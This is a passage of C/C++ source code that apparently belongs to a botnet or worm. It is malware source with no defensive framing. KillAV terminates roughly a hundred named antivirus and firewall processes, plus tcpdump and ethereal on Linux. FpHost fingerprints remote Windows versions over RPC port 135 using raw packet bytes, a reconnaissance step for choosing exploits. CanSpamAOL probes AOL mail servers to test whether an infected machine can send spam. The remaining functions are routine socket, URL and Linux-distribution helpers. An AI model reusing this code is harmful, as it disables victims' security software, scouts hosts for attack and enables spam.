	if(bind(sListenSocket, (sockaddr*)&ssin, sizeof(ssin))!=0)
	{	xClose(sListenSocket); return SOCKET_ERROR; }
	return sListenSocket; }

int DoTcpAccept(int sSocket)
{	if(listen(sSocket, 10)==SOCKET_ERROR) return SOCKET_ERROR;
	sockaddr_in cssin; socklen_t clen=sizeof(cssin);
	int sClientSocket=accept(sSocket, (sockaddr*)&cssin, &clen);
	if(sClientSocket==SOCKET_ERROR) return SOCKET_ERROR;
	return sClientSocket; }

/*
	This kills a process
	Win32:	Uses PsApi to enum processes and terminates matching strings
	Linux:	Uses "killall -9 <process name>" to kill every instance of the process
*/

bool KillProcess(const char *szProcName)
{
#ifdef WIN32
	HANDLE hProcess; DWORD aProcesses[1024], cbNeeded, cProcesses; bool bRetVal=false;
	unsigned int i; char szProcessName[MAX_PATH]; HMODULE hMod;
	if(!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) return false;
	cProcesses=cbNeeded/sizeof(DWORD);
	for(i=0; i<cProcesses; i++)
	{	strcpy(szProcessName, "unknown");
		hProcess=OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, aProcesses[i]);
		if(hProcess)
		{	if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
			{	GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				if(!stricmp(szProcessName, szProcName))
				{	TerminateProcess(hProcess, 0);
					bRetVal=true; } }
		CloseHandle(hProcess); } }
	return bRetVal;
#else
	CString sCmdBuf; sCmdBuf.Format("killall -q -9 %s", szProcName);
	system(sCmdBuf.CStr()); return true;
#endif
}

/*
	This returns the filename of the executable in the filesystem
	Win32:	uses GetModuleFilename on the currently running module
	Linux:	uses /proc/<pid>/exe which is a like to the executable image
*/

char* GetFilename(char* szFilename, size_t sBufSize)
{
#ifdef WIN32
	GetModuleFileName(GetModuleHandle(NULL), szFilename, sBufSize);
	return szFilename;
#else
	char szLinkname[64]; pid_t pSelf=getpid(); int iRet;	
	snprintf(szLinkname, sizeof(szLinkname), "/proc/%i/exe", pSelf);
	iRet=readlink(szLinkname, szFilename, sBufSize);
	if(iRet==-1) return NULL; if(iRet>=sBufSize) { errno=ERANGE; return NULL; }
	szFilename[iRet]=0; return szFilename;
#endif
}

/*
	This calculates a TCP/IP checksum
*/

unsigned short checksum(unsigned short *buffer, int size)
{	unsigned long cksum=0;
	while(size>1) { cksum+=*buffer++; size-=2; }
	if(size) cksum+=*(unsigned char*)buffer;
	cksum=(cksum>>16)+(cksum&0xffff); cksum+=(cksum>>16);
	return(unsigned short)(~cksum); }

/*
	This returns a static in_addr with a host assigned
*/

in_addr &to_in_addr(unsigned long lHost)
{	static in_addr ina; ina.s_addr=lHost; return ina; }

/*
	This kills all active Antivirus processes that match
	Thanks to FSecure's Bugbear.B analysis @
	http://www.f-secure.com/v-descs/bugbear_b.shtml
*/

void KillAV()
{	
#ifdef WIN32
	KillProcess("_AVP32.EXE"); KillProcess("_AVPCC.EXE"); KillProcess("_AVPM.EXE");
	KillProcess("ACKWIN32.EXE"); KillProcess("ANTI-TROJAN.EXE"); KillProcess("APVXDWIN.EXE");
	KillProcess("AUTODOWN.EXE"); KillProcess("AVCONSOL.EXE"); KillProcess("AVE32.EXE");
	KillProcess("AVGCTRL.EXE"); KillProcess("AVKSERV.EXE"); KillProcess("AVNT.EXE");
	KillProcess("AVP.EXE"); KillProcess("AVP32.EXE"); KillProcess("AVPCC.EXE");
	KillProcess("AVPDOS32.EXE"); KillProcess("AVPM.EXE"); KillProcess("AVPTC32.EXE");
	KillProcess("AVPUPD.EXE"); KillProcess("AVSCHED32.EXE"); KillProcess("AVWIN95.EXE");
	KillProcess("AVWUPD32.EXE"); KillProcess("BLACKD.EXE"); KillProcess("BLACKICE.EXE");
	KillProcess("CFIADMIN.EXE"); KillProcess("CFIAUDIT.EXE"); KillProcess("CFINET.EXE");
	KillProcess("CFINET32.EXE"); KillProcess("CLAW95.EXE"); KillProcess("CLAW95CF.EXE");
	KillProcess("CLEANER.EXE"); KillProcess("CLEANER3.EXE"); KillProcess("DVP95.EXE");
	KillProcess("DVP95_0.EXE"); KillProcess("ECENGINE.EXE"); KillProcess("ESAFE.EXE");
	KillProcess("ESPWATCH.EXE"); KillProcess("F-AGNT95.EXE"); KillProcess("F-PROT.EXE");
	KillProcess("F-PROT95.EXE"); KillProcess("F-STOPW.EXE"); KillProcess("FINDVIRU.EXE");
	KillProcess("FP-WIN.EXE"); KillProcess("FPROT.EXE"); KillProcess("FRW.EXE");
	KillProcess("IAMAPP.EXE"); KillProcess("IAMSERV.EXE"); KillProcess("IBMASN.EXE");
	KillProcess("IBMAVSP.EXE"); KillProcess("ICLOAD95.EXE"); KillProcess("ICLOADNT.EXE");
	KillProcess("ICMON.EXE"); KillProcess("ICSUPP95.EXE"); KillProcess("ICSUPPNT.EXE");
	KillProcess("IFACE.EXE"); KillProcess("IOMON98.EXE"); KillProcess("JEDI.EXE");
	KillProcess("LOCKDOWN2000.EXE"); KillProcess("LOOKOUT.EXE"); KillProcess("LUALL.EXE");
	KillProcess("MOOLIVE.EXE"); KillProcess("MPFTRAY.EXE"); KillProcess("N32SCANW.EXE");
	KillProcess("NAVAPW32.EXE"); KillProcess("NAVLU32.EXE"); KillProcess("NAVNT.EXE");
	KillProcess("NAVW32.EXE"); KillProcess("NAVWNT.EXE"); KillProcess("NISUM.EXE");
	KillProcess("NMAIN.EXE"); KillProcess("NORMIST.EXE"); KillProcess("NUPGRADE.EXE");
	KillProcess("NVC95.EXE"); KillProcess("OUTPOST.EXE"); KillProcess("PADMIN.EXE");
	KillProcess("PAVCL.EXE"); KillProcess("PAVSCHED.EXE"); KillProcess("PAVW.EXE");
	KillProcess("PCCWIN98.EXE"); KillProcess("PCFWALLICON.EXE"); KillProcess("PERSFW.EXE");
	KillProcess("RAV7.EXE"); KillProcess("RAV7WIN.EXE"); KillProcess("RESCUE.EXE");
	KillProcess("SAFEWEB.EXE"); KillProcess("SCAN32.EXE"); KillProcess("SCAN95.EXE");
	KillProcess("SCANPM.EXE"); KillProcess("SCRSCAN.EXE"); KillProcess("SERV95.EXE");
	KillProcess("SMC.EXE"); KillProcess("SPHINX.EXE"); KillProcess("SWEEP95.EXE");
	KillProcess("TBSCAN.EXE"); KillProcess("TCA.EXE"); KillProcess("TDS2-98.EXE");
	KillProcess("TDS2-NT.EXE"); KillProcess("VET95.EXE"); KillProcess("VETTRAY.EXE");
	KillProcess("VSCAN40.EXE"); KillProcess("VSECOMR.EXE"); KillProcess("VSHWIN32.EXE");
	KillProcess("VSSTAT.EXE"); KillProcess("WEBSCANX.EXE"); KillProcess("WFINDV32.EXE");
	KillProcess("ZONEALARM.EXE");
#else
	KillProcess("tcpdump"); KillProcess("ethereal");
#endif
}

int GetFileSize(FILE *fp)
{	long lLastPos=ftell(fp); fseek(fp, 0, SEEK_END);
	long lFileSize=ftell(fp); fseek(fp, lLastPos, SEEK_SET);
	return (int)lFileSize; }

/*
	This breaks an URL to pieces, and stores them in pURL
*/

bool ParseURL(const char *szURL, url *pURL)
{	if(!szURL) return false; CString sURL; sURL.Assign(szURL);
	// Get the protocol (ie. http), and check if its a supported protocol
	pURL->sProto.Assign(sURL.Token(0, ":"));
	if(pURL->sProto.Compare("http") && pURL->sProto.Compare("ftp")) return false;
	// Get the hostname and check if it isnt empty
	pURL->sHost.Assign(sURL.Token(1, "/").Token(0, ":"));
	if(!pURL->sHost.Compare("")) return false;
	// Get the port and check if it isnt null
	pURL->iPort=atoi(sURL.Token(1, "/").Token(1, ":").CStr());
	if(!pURL->iPort) pURL->iPort=80;
	// Get the request for the server
	CString sReq=sURL.Mid(sURL.Find("/")); sReq=sReq.Mid(sReq.Find("/")); sReq=sReq.Mid(sReq.Find("/"));
	pURL->sReq.Assign("/"); pURL->sReq.Append(sReq.Token(0, " "));
	return true; }

/*
	This checks if pSearch is contained in pMem
*/

bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;
	return false; }

char rpcfp_bindstr[]=
	"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
	"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
	"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
	"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
	"\x2b\x10\x48\x60\x02\x00\x00\x00";

char rpcfp_inqifids[]=
	"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00";

char w2kuuid_sig[]=
	"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
	"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";


int FpHost(const char *szHost, int iFpType)
{	switch(iFpType) {
	case FP_RPC:
	{	int iRetVal=OS_UNKNOWN;
		int sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); char szRecvBuf[8192];
		if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) return OS_UNKNOWN;
		sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
		ssin.sin_port=htons(135); ssin.sin_addr.s_addr=ResolveAddress(szHost);
		int iErr=connect(sSocket, (sockaddr*)&ssin, sizeof(sockaddr_in));
		if(iErr!=SOCKET_ERROR)
		{	iErr=xWrite(sSocket, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1);
			if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
			iErr=xRead(sSocket, szRecvBuf, sizeof(szRecvBuf));
			if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
			if(szRecvBuf[2]==DCE_PKT_BINDACK)
			{	iErr=xWrite(sSocket, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1);
				if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
				iErr=xRead(sSocket, szRecvBuf, sizeof(szRecvBuf));
				if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
				if(szRecvBuf[2]==DCE_PKT_RESPONSE)
				{	if(MemContains(szRecvBuf, iErr, w2kuuid_sig, sizeof(w2kuuid_sig)-1))
					{	if(iErr<300) iRetVal=OS_WINNT; else iRetVal=OS_WIN2K; }
					else if(MemContains(szRecvBuf, iErr, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
						iRetVal=OS_WINXP;
					else
						iRetVal=OS_UNKNOWN; }
				else
				{	xClose(sSocket); return iRetVal; } }
			else
			{	xClose(sSocket); return iRetVal; } }
		else
		{	xClose(sSocket); return iRetVal; }
		xClose(sSocket); return iRetVal; }
		break;
	case FP_PORT5K:
		if(ScanPort(szHost, 5000)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	default:
		return OS_UNKNOWN;
		break; }
	return OS_UNKNOWN; }

/*
	Blocked message:
554- (RTR:DU)  The IP address you are using to connect to AOL is a dynamic
554- (residential) IP address.  AOL will not accept future e-mail transactions
554- from this IP address until your ISP removes this IP address from its list
554- of dynamic (residential) IP addresses.  For additional information,
554  please visit http://postmaster.info.aol.com.

	Accept message:
	220-rly-xi02.mx.aol.com ESMTP mail_relay_in-xi2.1; Wed, 24 Sep 2003 18:39:38 -04
*/

bool CanSpamAOL() {
	int iRnd=brandom(1, 4); char *szDNS;
	int iIsMsg_Matched=0;	// How much the AOL blocking message has been matched in %
							// 25% are for occurence of string "postmaster.info.aol.com"
							// 20% are for an immediate 554
							// 10% are for a line count of 5
							// 10% are for occurence of string "(RTR:DU)"
							// 10% are for occurence of string "not accept"
							// 5% are for occurence of string "dynamic" (occurs 2 times)
							// 5% are for occurence of string "residential" (occurs 2 times)
							// 5% are for occurence of string "are using to"
	switch(iRnd) {
	case 1:
		szDNS="mailin-01.mx.aol.com";
		break;
	case 2:
		szDNS="mailin-02.mx.aol.com";
		break;
	case 3:
		szDNS="mailin-03.mx.aol.com";
		break;
	case 4:
		szDNS="mailin-04.mx.aol.com";
		break;
	default:
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(9, "CanSpamAOL(): Unknown value %d in switch statement.\n", iRnd);
#endif
		break; }

	int sAOLSock=DoTcpConnect(szDNS, 25); if(sAOLSock==SOCKET_ERROR) return false;
	int iCount=0; char szBuf[4096]; while(recv_line(sAOLSock, szBuf, sizeof(szBuf))) {
		if(strstr(szBuf, "220-") && strstr(szBuf, "ESMTP")) break;
		if(strstr(szBuf, "postmaster.info.aol.com")) iIsMsg_Matched+=25;
		if(strstr(szBuf, "554-") && iCount==1) iIsMsg_Matched+=20;
		if(strstr(szBuf, "(RTR:DU)")) iIsMsg_Matched+=10;
		if(strstr(szBuf, "not accept")) iIsMsg_Matched+=10;
		if(strstr(szBuf, "dynamic")) iIsMsg_Matched+=5;
		if(strstr(szBuf, "residential")) iIsMsg_Matched+=5;
		if(strstr(szBuf, "are using to")) iIsMsg_Matched+=5;
		iCount++; }
	if(iCount==5) iIsMsg_Matched+=10;

	xWrite(sAOLSock, "QUIT\n", sizeof("QUIT\n"));

	bool bRetVal=false;

	if(iIsMsg_Matched <= 5) bRetVal=true;

	xClose(sAOLSock);

	return bRetVal; }

bool GetKVersion(char **pszBuf, int iDistro)
{
	switch(iDistro)
	{
	case LINUX_TYPE_SUSE:
		system("uname -r -s -m > ktemp");
		break;
	case LINUX_TYPE_DEBIAN:
		system("uname -r -o -m > ktemp");
		break;
	default:
		system("uname -r -m > ktemp");
		break;
	}
	
	FILE *fp=fopen("ktemp", "r"); if(!fp) return false;
	fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
	if(lFileSize==0) { fclose(fp); return false; }
	char szKVer[64];
	if(fread(szKVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
	for(int i=0;i<lFileSize;i++) if(szKVer[i]=='\n' || szKVer[i]=='\r') szKVer[i]='\0';
	
	*pszBuf=(char*)malloc(lFileSize); if(!*pszBuf) { fclose(fp); return false; }
		
	sprintf(*pszBuf, "%s", szKVer);

	fclose(fp);
	
	system("rm -f ktemp");
	
	return true;
}

bool GetVersion(char **pszBuf, int iDistro)
{
	switch(iDistro)
	{
	case LINUX_TYPE_SUSE:
		{	FILE *fp=fopen("/etc/SuSE-release", "r");
			if(!fp) return false;
			fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
			if(lFileSize==0) { fclose(fp); return false; }
			char szSuSEVer[64];
			if(fread(szSuSEVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
			for(int i=0;i<lFileSize;i++) if(szSuSEVer[i]=='\n' || szSuSEVer[i]=='\r') szSuSEVer[i]='\0';
			
			char *szVersionNum;
			strtok(szSuSEVer, " "); strtok(NULL, " "); szVersionNum=strtok(NULL, " ");

			*pszBuf=(char*)malloc(256); if(!*pszBuf) { fclose(fp); return false; }
			
			sprintf(*pszBuf, "SuSE %s", szVersionNum);

			fclose(fp); return true;
		}
		break;
	case LINUX_TYPE_REDHAT:
		{	FILE *fp=fopen("/etc/redhat-release", "r");
			if(!fp) return false;
			fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
			if(lFileSize==0) { fclose(fp); return false; }
			char szRedHatVer[64];
			if(fread(szRedHatVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
			for(int i=0;i<lFileSize;i++) if(szRedHatVer[i]=='\n' || szRedHatVer[i]=='\r') szRedHatVer[i]='\0';
			
			char *szVersionNum; char *szReleaseName;
			if(szRedHatVer[0]=='r') // RedHat versions <= 5.0
			{	strtok(szRedHatVer, " "); szVersionNum=strtok(NULL, " ");
				char *szTemp=strtok(NULL, " "); szTemp=strtok(szTemp, "(");
				szReleaseName=strtok(szTemp, ")");
			}
			else if(szRedHatVer[0]=='R') // RedHat versions >= 5.2
			{	strtok(szRedHatVer, " "); strtok(NULL, " "); strtok(NULL, " "); strtok(NULL, " "); szVersionNum=strtok(NULL, " ");
				char *szTemp=strtok(NULL, " "); szTemp=strtok(szTemp, "(");
				szReleaseName=strtok(szTemp, ")");
			}
			else { fclose(fp); return false; }

			*pszBuf=(char*)malloc(256); if(!*pszBuf) { fclose(fp); return false; }
			
			sprintf(*pszBuf, "Red Hat %s (%s)", szVersionNum, szReleaseName);

			fclose(fp); return true;
		}
		break;
	case LINUX_TYPE_DEBIAN:
		{	FILE *fp=fopen("/etc/debian_version", "r");
			if(!fp) return false;
			fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
			if(lFileSize==0) { fclose(fp); return false; }
			char szDebVer[16];
			if(fread(szDebVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
			for(int i=0;i<lFileSize;i++) if(szDebVer[i]=='\n' || szDebVer[i]=='\r') szDebVer[i]='\0';

			*pszBuf=(char*)malloc(strlen(szDebVer)+strlen("Debian ")+1); if(!*pszBuf) { fclose(fp); return false; }
			sprintf(*pszBuf, "Debian %s", szDebVer);

			fclose(fp); return true;
		}
		break;
	case LINUX_TYPE_SLACKWARE:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "Slackware");
		}
		break;
	case LINUX_TYPE_MANDRAKE:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "Mandrake");
		}
		break;
	case LINUX_TYPE_YELLOWDOG:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "Yellowdog");
		}
		break;
	case LINUX_TYPE_TURBOLINUX:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "TurboLinux");
		}
		break;
	case LINUX_TYPE_UNITEDLINUX:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "UnitedLinux");
		}
		break;
	case LINUX_TYPE_FREEBSD:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "FreeBSD");
		}
		break;
	default:
		return false;
		break;
	}
	return false;
}

int GetDistro()
{
	FILE *fp;
	
	fp=fopen("/etc/SuSE-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_SUSE; }
	
	fp=fopen("/etc/redhat-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_REDHAT; }

	fp=fopen("/etc/debian_version", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_DEBIAN; }

	fp=fopen("/etc/mandrake-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_MANDRAKE; }

	fp=fopen("/etc/yellowdog-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_YELLOWDOG; }

	fp=fopen("/etc/turbolinux-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_TURBOLINUX; }

	fp=fopen("/etc/slackware-version", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_SLACKWARE; }

	fp=fopen("/etc/UnitedLinux-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_UNITEDLINUX; }
	
	fclose(fp); return LINUX_TYPE_UNKNOWN;
}

// My test function, so i don't have to recompile everything for testing code

void test()
{
}
